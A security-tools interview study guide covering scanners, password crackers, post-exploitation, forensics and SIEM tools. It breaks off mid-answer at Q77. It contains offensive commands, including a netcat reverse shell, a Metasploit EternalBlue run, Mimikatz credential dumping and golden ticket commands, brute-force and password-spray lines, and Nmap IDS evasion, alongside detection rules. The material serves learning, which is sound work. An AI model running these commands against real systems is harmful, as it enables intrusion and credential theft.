# 🛠️ SECURITY TOOLS - 100 Interview Questions & Answers

## Priority Legend
- 🔴 **HIGH PRIORITY** - Most Probable (Q1-40)
- 🟡 **MEDIUM PRIORITY** - Important Concepts (Q41-70)
- 🟢 **ADVANCED** - Complex/In-Depth (Q71-100)

---

# 🔴 HIGH PRIORITY - Most Probable Questions (1-40)

---

## Q1: What is Nmap and why is it used?
**Answer:**
Nmap (Network Mapper) is an open-source network scanning and security auditing tool used for:
- **Host Discovery**: Finding live hosts on a network
- **Port Scanning**: Identifying open ports and services
- **Service Detection**: Determining software versions running on ports
- **OS Fingerprinting**: Detecting operating systems
- **Vulnerability Assessment**: Using NSE scripts for security checks

**Basic Command:**
```bash
nmap -sV -O 192.168.1.1
```

---

## Q2: What are the different types of Nmap scans?
**Answer:**

| Scan Type | Flag | Description |
|-----------|------|-------------|
| **TCP SYN** | -sS | Stealthy, half-open scan (default) |
| **TCP Connect** | -sT | Full TCP connection, detectable |
| **UDP Scan** | -sU | Scans UDP ports (slower) |
| **FIN Scan** | -sF | Sends FIN flag, evades firewalls |
| **XMAS Scan** | -sX | Sets FIN, PSH, URG flags |
| **NULL Scan** | -sN | No flags set |
| **ACK Scan** | -sA | Checks firewall rules |
| **Ping Scan** | -sn | Host discovery only |

---

## Q3: What is Wireshark and its main purpose?
**Answer:**
Wireshark is a free, open-source network protocol analyzer used for:
- **Packet Capture**: Capturing live network traffic
- **Protocol Analysis**: Deep inspection of hundreds of protocols
- **Troubleshooting**: Network issues, latency problems
- **Security Analysis**: Detecting malware, suspicious activity
- **Forensics**: Analyzing captured traffic for investigations

It displays packets in a human-readable format with color coding for easy identification.

---

## Q4: What are Wireshark display filters? Give examples.
**Answer:**
Display filters help filter captured packets to focus on specific traffic:

| Filter | Description |
|--------|-------------|
| `ip.addr == 192.168.1.1` | Traffic to/from IP |
| `tcp.port == 80` | HTTP traffic |
| `http` | All HTTP packets |
| `dns` | DNS queries/responses |
| `tcp.flags.syn == 1` | SYN packets only |
| `http.request.method == "POST"` | HTTP POST requests |
| `frame contains "password"` | Packets containing "password" |
| `!(arp or dns)` | Exclude ARP and DNS |

---

## Q5: What is Burp Suite and its components?
**Answer:**
Burp Suite is a web application security testing platform with key components:

| Component | Purpose |
|-----------|---------|
| **Proxy** | Intercepts HTTP/HTTPS traffic |
| **Scanner** | Automated vulnerability scanning (Pro) |
| **Intruder** | Automated customized attacks |
| **Repeater** | Manual request modification |
| **Sequencer** | Token randomness analysis |
| **Decoder** | Encode/decode data |
| **Comparer** | Compare data/responses |
| **Extender** | Plugin support (BApps) |

---

## Q6: How do you intercept HTTPS traffic in Burp Suite?
**Answer:**
To intercept HTTPS traffic:
1. **Configure browser proxy**: Set browser to use 127.0.0.1:8080
2. **Export Burp CA certificate**: Proxy → Options → Import/Export CA certificate
3. **Install certificate in browser**: Import as trusted root CA
4. **Enable interception**: Proxy → Intercept → Intercept is on

This allows Burp to perform a man-in-the-middle on HTTPS by using its own certificate.

---

## Q7: What is Metasploit Framework?
**Answer:**
Metasploit is the world's most popular penetration testing framework:

**Components:**
- **msfconsole**: Main command-line interface
- **Exploits**: Code to exploit vulnerabilities
- **Payloads**: Code executed after exploitation (shells, meterpreter)
- **Auxiliaries**: Scanning, fuzzing, enumeration modules
- **Post-exploitation**: Modules for after gaining access

**Basic Workflow:**
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

---

## Q8: What is Meterpreter and why is it powerful?
**Answer:**
Meterpreter is Metasploit's advanced payload:

**Features:**
- **In-memory execution**: No files written to disk
- **Encrypted communication**: Hard to detect
- **Migration**: Move between processes
- **Privilege escalation**: Built-in commands
- **Persistence**: Maintain access
- **Screenshots, keylogging**: Information gathering

**Common Commands:**
```
sysinfo          # System information
getuid           # Current user
getsystem        # Escalate privileges
hashdump         # Dump password hashes
screenshot       # Take screenshot
keyscan_start    # Start keylogger
```

---

## Q9: What is SQLMap and how is it used?
**Answer:**
SQLMap is an automatic SQL injection detection and exploitation tool.

**Basic Usage:**
```bash
# Test URL parameter
sqlmap -u "http://example.com/page?id=1"

# With cookies
sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"

# Dump database
sqlmap -u "http://example.com/page?id=1" --dbs

# Dump specific table
sqlmap -u "http://example.com/page?id=1" -D dbname -T users --dump
```

**Key Features:**
- Auto-detects DBMS type (MySQL, PostgreSQL, MSSQL, etc.)
- Multiple injection techniques (UNION, blind, error-based)
- Database enumeration and data extraction
- OS command execution capabilities

---

## Q10: What is Hashcat and what is it used for?
**Answer:**
Hashcat is the world's fastest password recovery tool using GPU acceleration.

**Common Usage:**
```bash
# Dictionary attack on MD5
hashcat -m 0 hashes.txt wordlist.txt

# Brute force
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a?a?a

# Rule-based attack
hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule
```

**Common Hash Modes:**
| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1000 | NTLM |
| 3200 | bcrypt |
| 1800 | SHA512crypt |

---

## Q11: What is John the Ripper?
**Answer:**
John the Ripper is a fast password cracker supporting many hash types.

**Features:**
- Auto-detects hash types
- Multiple attack modes (single, wordlist, incremental)
- Custom rules for password mangling
- Supports many formats (Unix, Windows, zip, etc.)

**Usage:**
```bash
# Crack Unix passwords
john /etc/shadow

# With wordlist
john --wordlist=/path/to/wordlist.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=NT hashes.txt
```

---

## Q12: What is Hydra and what protocols does it support?
**Answer:**
Hydra is a fast online password brute-force tool supporting 50+ protocols.

**Supported Protocols:**
SSH, FTP, HTTP, HTTPS, SMB, MySQL, PostgreSQL, RDP, Telnet, VNC, LDAP, etc.

**Examples:**
```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# HTTP POST form
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP attack
hydra -L users.txt -P passwords.txt ftp://192.168.1.100
```

---

## Q13: What is OWASP ZAP?
**Answer:**
OWASP ZAP (Zed Attack Proxy) is a free, open-source web security scanner.

**Features:**
- **Intercepting Proxy**: Inspect/modify requests
- **Automated Scanner**: Find common vulnerabilities
- **Spidering**: Discover application content
- **Fuzzer**: Test for edge cases
- **Active/Passive Scanning**: Different scanning modes
- **API Support**: Integration with CI/CD

**Difference from Burp Suite:**
- ZAP is completely free
- Open-source community
- Better CI/CD integration
- Burp Pro has more advanced features

---

## Q14: What is Nikto?
**Answer:**
Nikto is an open-source web server scanner that detects:
- Dangerous files/programs
- Outdated server versions
- Misconfigurations
- Default files and installations
- Server and software issues

**Usage:**
```bash
# Basic scan
nikto -h http://example.com

# Scan specific port
nikto -h 192.168.1.100 -p 8080

# With SSL
nikto -h https://example.com -ssl

# Output to file
nikto -h http://example.com -o report.html -Format html
```

---

## Q15: What is Netcat and why is it called the "Swiss Army Knife"?
**Answer:**
Netcat (nc) is a versatile networking utility for reading/writing network connections.

**Use Cases:**
```bash
# Port scanning
nc -zv 192.168.1.100 20-100

# Banner grabbing
nc -v 192.168.1.100 80

# Listen on port (reverse shell)
nc -lvp 4444

# Connect to listener
nc 192.168.1.50 4444 -e /bin/bash

# File transfer
# Receiver: nc -lvp 1234 > file.txt
# Sender: nc 192.168.1.50 1234 < file.txt

# Simple chat
nc -lp 1234  # Server
nc 192.168.1.50 1234  # Client
```

---

## Q16: What is Gobuster/Dirbuster?
**Answer:**
Directory/file brute-forcing tools for web applications.

**Gobuster Usage:**
```bash
# Directory brute force
gobuster dir -u http://example.com -w /path/to/wordlist.txt

# DNS subdomain enumeration
gobuster dns -d example.com -w subdomains.txt

# Virtual host discovery
gobuster vhost -u http://example.com -w vhosts.txt
```

**Purpose:**
- Find hidden directories and files
- Discover backup files (.bak, .old)
- Find admin panels
- Enumerate subdomains

---

## Q17: What is Aircrack-ng suite?
**Answer:**
Aircrack-ng is a complete suite for WiFi security assessment:

| Tool | Purpose |
|------|---------|
| **airmon-ng** | Enable/disable monitor mode |
| **airodump-ng** | Capture packets, show networks |
| **aireplay-ng** | Packet injection, deauth attacks |
| **aircrack-ng** | Crack WEP/WPA passwords |

**Basic WPA Crack Workflow:**
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid XX:XX:XX:XX -w capture wlan0mon
aireplay-ng -0 10 -a XX:XX:XX:XX wlan0mon  # Deauth
aircrack-ng -w wordlist.txt capture.cap
```

---

## Q18: What is Volatility and when is it used?
**Answer:**
Volatility is a memory forensics framework for analyzing RAM dumps.

**Use Cases:**
- **Malware analysis**: Find malicious processes
- **Incident response**: Investigate compromised systems
- **Forensics**: Extract evidence from memory

**Common Commands (Volatility 3):**
```bash
# List processes
vol -f memory.dmp windows.pslist

# Network connections
vol -f memory.dmp windows.netscan

# Command history
vol -f memory.dmp windows.cmdline

# Dump process memory
vol -f memory.dmp windows.memmap --pid 1234 --dump
```

---

## Q19: What is Splunk and why is it important for security?
**Answer:**
Splunk is a leading SIEM (Security Information and Event Management) platform.

**Key Features:**
- **Log Collection**: Aggregates logs from all sources
- **Real-time Monitoring**: Live dashboards
- **Search & Analysis**: SPL (Search Processing Language)
- **Alerting**: Automated threat detection
- **Correlation**: Connect related events
- **Compliance**: Generate audit reports

**Basic SPL:**
```
index=security sourcetype=firewall action=blocked
| stats count by src_ip
| sort -count
| head 10
```

---

## Q20: What is the ELK Stack?
**Answer:**
ELK Stack is an open-source log management and SIEM solution.

**Components:**
- **Elasticsearch**: Search and analytics engine (stores data)
- **Logstash**: Data processing pipeline (ingests data)
- **Kibana**: Visualization dashboard (displays data)
- **Beats**: Lightweight data shippers (collects data)

**Security Use Cases:**
- Log aggregation and analysis
- Threat hunting
- Security dashboards
- Compliance monitoring
- Incident investigation

---

## Q21: What is Snort?
**Answer:**
Snort is an open-source Network Intrusion Detection/Prevention System (IDS/IPS).

**Modes:**
- **Sniffer Mode**: Display packets
- **Packet Logger**: Log packets to disk
- **NIDS Mode**: Detect intrusions based on rules

**Basic Rule Structure:**
```
alert tcp any any -> any 80 (msg:"HTTP Traffic"; sid:1000001;)
```

**Rule Components:**
- Action (alert, log, pass, drop)
- Protocol (tcp, udp, icmp)
- Source/Destination (IP, port)
- Direction (->)
- Options (msg, content, sid)

---

## Q22: What is Nessus?
**Answer:**
Nessus is a proprietary vulnerability scanner by Tenable.

**Features:**
- **Vulnerability Scanning**: Identifies known vulnerabilities
- **Configuration Audit**: Checks misconfigurations
- **Compliance Checks**: CIS, HIPAA, PCI-DSS
- **Malware Detection**: Finds malicious software
- **Patch Assessment**: Identifies missing patches

**Workflow:**
1. Define scan policy
2. Configure targets
3. Run scan
4. Analyze results
5. Generate reports

---

## Q23: What is OpenVAS?
**Answer:**
OpenVAS (Open Vulnerability Assessment Scanner) is a free, open-source vulnerability scanner.

**Components:**
- **Greenbone Vulnerability Manager (GVM)**: Core framework
- **OpenVAS Scanner**: Scanning engine
- **GSA**: Web interface

**Difference from Nessus:**
- Free and open-source
- Community-maintained
- Slightly less comprehensive
- Good for learning and small orgs

---

## Q24: What is Shodan and how do hackers use it?
**Answer:**
Shodan is a search engine for internet-connected devices.

**Legitimate Uses:**
- Asset discovery
- Security research
- IoT device inventory

**Attacker Uses:**
- Find vulnerable systems
- Discover exposed services
- Locate misconfigured devices

**Search Examples:**
```
port:22 country:US
apache 2.2.3
webcam has_screenshot:true
default password
```

---

## Q25: What is theHarvester?
**Answer:**
theHarvester is an OSINT tool for gathering emails, names, subdomains, IPs.

**Usage:**
```bash
# Search using multiple sources
theHarvester -d example.com -b all

# Specific source
theHarvester -d example.com -b google

# DNS brute force
theHarvester -d example.com -b all -c
```

**Data Sources:**
Google, Bing, LinkedIn, Twitter, Shodan, Censys, etc.

---

## Q26: What is Maltego?
**Answer:**
Maltego is a visual link analysis and OSINT tool for investigations.

**Features:**
- **Visual graphs**: Relationship mapping
- **Transforms**: Automated data gathering
- **Entity types**: People, domains, IPs, emails
- **Integration**: Multiple data sources

**Use Cases:**
- Cyber investigations
- Threat intelligence
- Fraud detection
- Social engineering reconnaissance

---

## Q27: What is Recon-ng?
**Answer:**
Recon-ng is a full-featured web reconnaissance framework written in Python.

**Features:**
- Modular architecture (like Metasploit)
- Multiple data sources
- Database storage
- Reporting capabilities

**Usage:**
```
recon-ng
workspaces create example_recon
modules load recon/domains-hosts/bing_domain_web
options set SOURCE example.com
run
```

---

## Q28: What is enum4linux?
**Answer:**
enum4linux is a tool for enumerating Windows/Samba systems.

**Information Gathered:**
- User listing
- Share enumeration
- Group membership
- Password policy
- OS information

**Usage:**
```bash
# Full enumeration
enum4linux -a 192.168.1.100

# Users only
enum4linux -U 192.168.1.100

# Shares only
enum4linux -S 192.168.1.100
```

---

## Q29: What is Mimikatz?
**Answer:**
Mimikatz is a Windows post-exploitation tool for extracting credentials.

**Capabilities:**
- Extract plaintext passwords from memory
- Dump password hashes (NTLM)
- Kerberos ticket extraction
- Pass-the-hash attacks
- Golden/Silver ticket attacks

**Common Commands:**
```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
kerberos::golden
```

**Why it works:** Windows caches credentials in LSASS process memory.

---

## Q30: What is Responder?
**Answer:**
Responder is a LLMNR/NBT-NS/mDNS poisoner for credential theft on local networks.

**How it works:**
1. Victim's DNS fails
2. Windows asks "who knows this name?" via LLMNR/NBT-NS
3. Responder answers "I know it!"
4. Victim sends credentials to Responder

**Usage:**
```bash
responder -I eth0 -wrf
```

**Defense:**
- Disable LLMNR and NBT-NS via Group Policy
- Network segmentation
- Monitor for Responder activity

---

## Q31: What is Impacket?
**Answer:**
Impacket is a collection of Python tools for working with network protocols.

**Popular Tools:**
| Tool | Purpose |
|------|---------|
| psexec.py | Remote command execution |
| secretsdump.py | Dump credentials remotely |
| wmiexec.py | WMI-based execution |
| smbclient.py | SMB client |
| GetNPUsers.py | AS-REP roasting |
| GetUserSPNs.py | Kerberoasting |

**Example:**
```bash
secretsdump.py domain/user:password@192.168.1.100
```

---

## Q32: What is CrackMapExec (CME)?
**Answer:**
CrackMapExec is a post-exploitation tool for Windows/AD environments.

**Features:**
- Network reconnaissance
- Credential validation
- Command execution
- Password spraying
- Mimikatz execution

**Usage:**
```bash
# Check credentials
crackmapexec smb 192.168.1.0/24 -u admin -p password

# Execute command
crackmapexec smb 192.168.1.100 -u admin -p pass -x "whoami"

# Password spray
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt --continue-on-success
```

---

## Q33: What is Ghidra?
**Answer:**
Ghidra is NSA's free reverse engineering tool.

**Features:**
- Disassembly
- Decompilation (to pseudo-C)
- Scripting support (Python/Java)
- Collaborative work
- Multiple architectures (x86, ARM, MIPS)

**Use Cases:**
- Malware analysis
- Vulnerability research
- Binary analysis
- CTF challenges

**Alternative:** IDA Pro (commercial)

---

## Q34: What is Autopsy?
**Answer:**
Autopsy is an open-source digital forensics platform.

**Features:**
- Disk image analysis
- File recovery
- Timeline analysis
- Keyword search
- Hash matching
- Web artifact analysis

**Supported Formats:**
- Raw disk images
- E01 (EnCase)
- Virtual machine files
- Logical files

---

## Q35: What is tcpdump?
**Answer:**
tcpdump is a command-line packet analyzer for Unix/Linux.

**Examples:**
```bash
# Capture all traffic
tcpdump -i eth0

# Capture specific host
tcpdump -i eth0 host 192.168.1.100

# Capture specific port
tcpdump -i eth0 port 80

# Save to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Verbose output
tcpdump -i eth0 -vvv
```

---

## Q36: What is Cewl?
**Answer:**
Cewl is a custom wordlist generator that spiders websites.

**Usage:**
```bash
# Generate wordlist from website
cewl http://example.com -w wordlist.txt

# Set depth
cewl http://example.com -d 3 -w wordlist.txt

# Minimum word length
cewl http://example.com -m 5 -w wordlist.txt

# Include emails
cewl http://example.com -e -w wordlist.txt
```

**Why useful:** Creates targeted wordlists based on company terminology.

---

## Q37: What is WPScan?
**Answer:**
WPScan is a WordPress security scanner.

**Checks for:**
- WordPress version vulnerabilities
- Plugin vulnerabilities
- Theme vulnerabilities
- Weak passwords
- Configuration issues
- User enumeration

**Usage:**
```bash
# Basic scan
wpscan --url http://example.com

# Enumerate users
wpscan --url http://example.com --enumerate u

# Password attack
wpscan --url http://example.com -U admin -P passwords.txt
```

---

## Q38: What is SearchSploit?
**Answer:**
SearchSploit is a command-line search tool for Exploit-DB.

**Usage:**
```bash
# Search for exploits
searchsploit apache 2.4

# Copy exploit to current directory
searchsploit -m 41570

# Examine exploit
searchsploit -x 41570
```

**Benefits:**
- Offline exploit database access
- Quick vulnerability research
- Included in Kali Linux

---

## Q39: What is Nuclei?
**Answer:**
Nuclei is a fast, template-based vulnerability scanner.

**Features:**
- YAML-based templates
- Community templates
- Fast scanning
- CI/CD integration

**Usage:**
```bash
# Scan with all templates
nuclei -u http://example.com

# Specific templates
nuclei -u http://example.com -t cves/

# Output to file
nuclei -u http://example.com -o results.txt
```

---

## Q40: What is Amass?
**Answer:**
Amass is an OWASP project for subdomain enumeration.

**Features:**
- Active and passive enumeration
- Multiple data sources
- DNS brute forcing
- ASN discovery

**Usage:**
```bash
# Passive enumeration
amass enum -passive -d example.com

# Active enumeration
amass enum -d example.com

# Brute force
amass enum -brute -d example.com -w wordlist.txt
```

---

# 🟡 MEDIUM PRIORITY - Important Concepts (41-70)

---

## Q41: What is the difference between Nmap -sS and -sT scans?
**Answer:**

| Aspect | -sS (SYN Scan) | -sT (TCP Connect) |
|--------|----------------|-------------------|
| Connection | Half-open (never completes) | Full TCP handshake |
| Speed | Faster | Slower |
| Stealth | More stealthy | Logged by most systems |
| Privileges | Requires root | No root needed |
| Detection | Harder to detect | Easy to detect |

---

## Q42: How do you detect a SYN flood attack using Wireshark?
**Answer:**
**Filters:**
```
tcp.flags.syn==1 && tcp.flags.ack==0
```

**Indicators:**
- Many SYN packets from same/random sources
- No corresponding SYN-ACK or ACK packets
- High packet rate to single target
- Target system showing high half-open connections

---

## Q43: What is the difference between active and passive reconnaissance tools?
**Answer:**

| Passive | Active |
|---------|--------|
| No direct contact with target | Direct interaction with target |
| Shodan, theHarvester, Maltego | Nmap, Burp Suite, Nikto |
| Undetectable | Can be detected |
| Public information only | Probes actual systems |
| Legal grey area safer | May require permission |

---

## Q44: Explain Nmap timing templates (-T0 to -T5).
**Answer:**

| Template | Name | Use Case |
|----------|------|----------|
| T0 | Paranoid | IDS evasion, very slow |
| T1 | Sneaky | IDS evasion |
| T2 | Polite | Less bandwidth, slower |
| T3 | Normal | Default |
| T4 | Aggressive | Fast, reliable network |
| T5 | Insane | Very fast, may miss results |

---

## Q45: What is the difference between Burp Suite Intruder attack types?
**Answer:**

| Type | Description |
|------|-------------|
| **Sniper** | Single payload position, one at a time |
| **Battering Ram** | Same payload in all positions |
| **Pitchfork** | Multiple payload sets, parallel (1-1 match) |
| **Cluster Bomb** | All combinations of payloads |

---

## Q46: How do you analyze malware safely using tools?
**Answer:**

**Setup:**
1. Use isolated VM (VirtualBox, VMware)
2. Snapshot before analysis
3. Disable network or use fake network
4. Use dedicated analysis system

**Tools:**
- **Static Analysis**: strings, PEiD, Detect-It-Easy, Ghidra
- **Dynamic Analysis**: Process Monitor, Wireshark, Regshot
- **Automated**: Any.run, VirusTotal, Hybrid Analysis

---

## Q47: What Wireshark filter would you use to find DNS tunneling?
**Answer:**
```
dns.qry.name.len > 50
dns.txt.len > 100
dns contains "txt"
dns.count.queries > 1
```

**Indicators:**
- Unusually long DNS queries
- High volume of TXT records
- Encoded/random-looking subdomain names
- Continuous DNS traffic to single domain

---

## Q48: What is the difference between IDS and IPS?
**Answer:**

| IDS | IPS |
|-----|-----|
| Detection only | Detection + Prevention |
| Alerts on threats | Blocks threats |
| Passive (out of band) | Inline (in traffic path) |
| No latency | May add latency |
| Snort (default mode) | Snort (inline mode) |

---

## Q49: How do you write a basic Snort rule to detect SQL injection?
**Answer:**
```
alert tcp any any -> any 80 (msg:"SQL Injection Attempt"; 
content:"' OR '1'='1"; nocase; 
content:"union"; nocase;
content:"select"; nocase;
sid:1000002; rev:1;)
```

---

## Q50: What is HTTP response splitting in Burp Suite?
**Answer:**
**Vulnerability:** Injecting CRLF (\r\n) characters in HTTP headers.

**Test in Burp:**
```
GET /page?param=value%0d%0aSet-Cookie:malicious=value HTTP/1.1
```

**Impact:**
- Cookie injection
- Cache poisoning
- XSS via injected content

---

## Q51: How do you detect ARP spoofing using Wireshark?
**Answer:**
**Filter:**
```
arp.duplicate-address-detected
```

**Manual Detection:**
- Multiple MACs claiming same IP
- ARP replies without requests
- Frequent ARP updates
- MAC address changes for gateway

---

## Q52: What are Metasploit payload types?
**Answer:**

| Type | Description |
|------|-------------|
| **Singles** | Self-contained, standalone |
| **Stagers** | Small, sets up communication |
| **Stages** | Downloaded by stager, larger functionality |

**Naming Convention:**
- `windows/shell_reverse_tcp` = Single
- `windows/meterpreter/reverse_tcp` = Stager + Stage

---

## Q53: What is the difference between bind and reverse shells?
**Answer:**

| Bind Shell | Reverse Shell |
|------------|---------------|
| Victim listens, attacker connects | Attacker listens, victim connects |
| Blocked by victim's firewall | Bypasses victim's firewall |
| Attacker needs victim's IP | Works behind NAT |
| Less common | More common |

---

## Q54: How do you use Nmap scripts (NSE)?
**Answer:**
```bash
# Run default scripts
nmap -sC 192.168.1.100

# Run specific script
nmap --script=http-vuln-cve2017-5638 192.168.1.100

# Run script category
nmap --script=vuln 192.168.1.100

# Script with arguments
nmap --script=http-brute --script-args userdb=users.txt 192.168.1.100

# List available scripts
ls /usr/share/nmap/scripts/
```

---

## Q55: What is pass-the-hash and which tool performs it?
**Answer:**
**Pass-the-Hash:** Using NTLM hash directly for authentication without knowing plaintext password.

**Tools:**
- Mimikatz
- Impacket (psexec.py, wmiexec.py)
- CrackMapExec
- Evil-WinRM

**Mimikatz:**
```
sekurlsa::pth /user:admin /domain:corp /ntlm:hash /run:cmd
```

---

## Q56: What is Kerberoasting and which tool is used?
**Answer:**
**Kerberoasting:** Requesting service tickets and cracking them offline.

**Process:**
1. Find SPNs (accounts with Service Principal Names)
2. Request TGS tickets
3. Extract encrypted part
4. Crack offline

**Tools:**
```bash
# Impacket
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1 -request

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

---

## Q57: What is AS-REP Roasting?
**Answer:**
**AS-REP Roasting:** Attacking accounts with "Do not require Kerberos preauthentication" enabled.

**Process:**
1. Find accounts without preauth
2. Request AS-REP
3. Crack offline

**Tools:**
```bash
# Impacket
GetNPUsers.py domain/ -dc-ip 192.168.1.1 -usersfile users.txt -no-pass

# Crack
hashcat -m 18200 hashes.txt wordlist.txt
```

---

## Q58: How do you detect suspicious processes in Volatility?
**Answer:**
```bash
# List processes
vol -f mem.dmp windows.pslist

# Process tree
vol -f mem.dmp windows.pstree

# Hidden processes
vol -f mem.dmp windows.psxview

# Network connections
vol -f mem.dmp windows.netscan
```

**Suspicious Indicators:**
- Processes with no parent
- svchost.exe not spawned by services.exe
- Unusual process names/paths
- Processes with network connections to external IPs

---

## Q59: What is the difference between Splunk and ELK?
**Answer:**

| Aspect | Splunk | ELK |
|--------|--------|-----|
| Cost | Commercial (expensive) | Open source (free) |
| Setup | Easy, enterprise-ready | More complex setup |
| Scalability | Excellent | Requires tuning |
| Support | Professional support | Community |
| Query Language | SPL | KQL (Kibana) |

---

## Q60: What is a SIEM correlation rule?
**Answer:**
**Correlation rules** connect multiple events to detect complex threats.

**Example Rule:**
IF:
- 5+ failed logins from same IP (in 5 minutes)
- THEN successful login from same IP
- THEN access to sensitive file

THEN: ALERT "Possible brute force followed by compromise"

---

## Q61: How do you detect credential stuffing in logs?
**Answer:**
**Indicators:**
- Multiple failed logins across different accounts
- Same source IP trying many usernames
- High volume of authentication attempts
- Geographic anomalies
- User-agent patterns

**Splunk Query:**
```
index=auth action=failure 
| stats count by src_ip
| where count > 100
```

---

## Q62: What is YARA and how is it used?
**Answer:**
YARA is a pattern matching tool for malware identification.

**Rule Example:**
```yara
rule suspicious_pe {
    meta:
        description = "Detects suspicious PE file"
    strings:
        $mz = { 4D 5A }
        $str1 = "cmd.exe" nocase
        $str2 = "powershell" nocase
    condition:
        $mz at 0 and any of ($str*)
}
```

**Usage:**
```bash
yara rules.yar suspicious_file.exe
```

---

## Q63: What is Sigma and how does it relate to SIEM?
**Answer:**
Sigma is a generic signature format for SIEM rules.

**Benefits:**
- Write once, use anywhere
- Convert to Splunk, ELK, QRadar, etc.
- Share detection rules
- Standardized format

**Example:**
```yaml
title: Mimikatz Detection
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        Image|endswith: '\mimikatz.exe'
    condition: selection
```

---

## Q64: What is BloodHound?
**Answer:**
BloodHound is an Active Directory attack path mapping tool.

**Uses:**
- Find paths to Domain Admin
- Identify privilege escalation opportunities
- Discover attack paths
- Visualize AD relationships

**Components:**
- Neo4j database
- SharpHound (data collector)
- BloodHound (visualization)

---

## Q65: What is PowerSploit?
**Answer:**
PowerSploit is a collection of PowerShell post-exploitation modules.

**Key Modules:**
| Module | Purpose |
|--------|---------|
| Invoke-Mimikatz | Load Mimikatz in memory |
| Get-Keystrokes | Keylogger |
| Invoke-Portscan | Port scanning |
| PowerUp | Privilege escalation |
| Find-LocalAdminAccess | Identify admin access |

---

## Q66: What is Evil-WinRM?
**Answer:**
Evil-WinRM is a Windows Remote Management (WinRM) shell for pentesting.

**Features:**
- Full PowerShell access
- File upload/download
- In-memory script loading
- Pass-the-hash support

**Usage:**
```bash
evil-winrm -i 192.168.1.100 -u admin -p password
evil-winrm -i 192.168.1.100 -u admin -H ntlm_hash
```

---

## Q67: What is Covenant?
**Answer:**
Covenant is a .NET command and control framework.

**Features:**
- Web-based interface
- Grunt agents
- Multiple listeners
- Task automation
- OPSEC features

**Use Case:** Red team operations and post-exploitation.

---

## Q68: What is Sliver?
**Answer:**
Sliver is a cross-platform C2 framework.

**Features:**
- Multi-platform agents (Windows, Linux, macOS)
- mTLS, HTTP, DNS communication
- Armory (extension system)
- Multiplayer support

**Modern alternative to Metasploit/Cobalt Strike.**

---

## Q69: What is Chisel?
**Answer:**
Chisel is a fast TCP/UDP tunnel over HTTP.

**Use Cases:**
- Bypass firewalls
- Access internal networks
- Port forwarding through web access

**Usage:**
```bash
# Server
chisel server -p 8080 --reverse

# Client (reverse tunnel)
chisel client attacker:8080 R:8888:127.0.0.1:3389
```

---

## Q70: What is Ligolo-ng?
**Answer:**
Ligolo-ng is a tunneling tool for penetration testing.

**Features:**
- Full tunnel (not just port forward)
- TUN interface
- Easy setup
- Cross-platform

**Use Case:** Pivoting through compromised hosts to access internal networks.

---

# 🟢 ADVANCED - Complex/In-Depth Questions (71-100)

---

## Q71: How would you evade IDS while scanning with Nmap?
**Answer:**
```bash
# Fragmentation
nmap -f 192.168.1.100

# Decoys
nmap -D RND:10 192.168.1.100

# Slow timing
nmap -T0 192.168.1.100

# Source port 53 (DNS)
nmap --source-port 53 192.168.1.100

# Randomize hosts
nmap --randomize-hosts 192.168.1.0/24

# Custom packets
nmap --data-length 25 192.168.1.100
```

---

## Q72: How do you detect and analyze a memory-only malware?
**Answer:**

**Challenge:** No disk artifacts, lives only in RAM.

**Detection:**
1. **EDR alerts** on suspicious memory allocation
2. **Memory forensics** with Volatility
3. **Process hollowing detection**
4. **Injected code detection**

**Volatility Analysis:**
```bash
vol -f mem.dmp windows.malfind
vol -f mem.dmp windows.hollowprocesses
vol -f mem.dmp windows.vadinfo --pid 1234
```

---

## Q73: Explain the process of analyzing a ransomware sample.
**Answer:**

**Static Analysis:**
1. Hash and check VirusTotal
2. Strings analysis
3. PE header analysis
4. Import table (CryptoAPI usage)
5. Disassembly in Ghidra

**Dynamic Analysis:**
1. Execute in isolated VM
2. Monitor file system (Process Monitor)
3. Network capture (Wireshark)
4. Registry changes (Regshot)
5. API monitoring (API Monitor)

**Key Indicators:**
- Crypto API imports (CryptEncrypt)
- File enumeration functions
- Shadow copy deletion commands
- Ransom note creation

---

## Q74: How do you detect a rootkit?
**Answer:**

**Techniques:**
1. **Cross-view analysis**: Compare kernel view vs user view
2. **Memory analysis**: Look for hooks
3. **Integrity checking**: Compare against known good

**Tools:**
- GMER
- RootkitRevealer
- chkrootkit (Linux)
- rkhunter (Linux)
- Volatility (memory analysis)

**Volatility:**
```bash
vol -f mem.dmp windows.ssdt  # System Service Descriptor Table hooks
vol -f mem.dmp windows.callbacks  # Kernel callbacks
vol -f mem.dmp windows.driverirp  # IRP hooks
```

---

## Q75: How would you detect lateral movement in a network?
**Answer:**

**Log Sources:**
- Windows Security logs (4624, 4625, 4648)
- PowerShell logs
- WMI logs
- RDP logs

**Indicators:**
- Type 3 (network) logons to multiple hosts
- New service installations
- Remote command execution (PSExec, WMI)
- Unusual SMB traffic

**Splunk Query:**
```
index=wineventlog EventCode=4624 Logon_Type=3
| stats dc(dest) as hosts by src_user
| where hosts > 5
```

---

## Q76: Explain Golden Ticket attack and detection.
**Answer:**

**Attack:**
- Forge TGT with Domain Admin privileges
- Requires KRBTGT hash
- Valid for years (10 years default)

**Mimikatz:**
```
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /id:500
```

**Detection:**
- TGT encryption mismatch (RC4 when AES expected)
- User doesn't exist in AD
- Account with SID 500 but different name
- Impossible travel time

---

## Q77: Explain Silver Ticket attack and detection.
**Answer:**

**Attack:**
- Forge TGS for specific service
- Requires service account hash
- Never touches DC

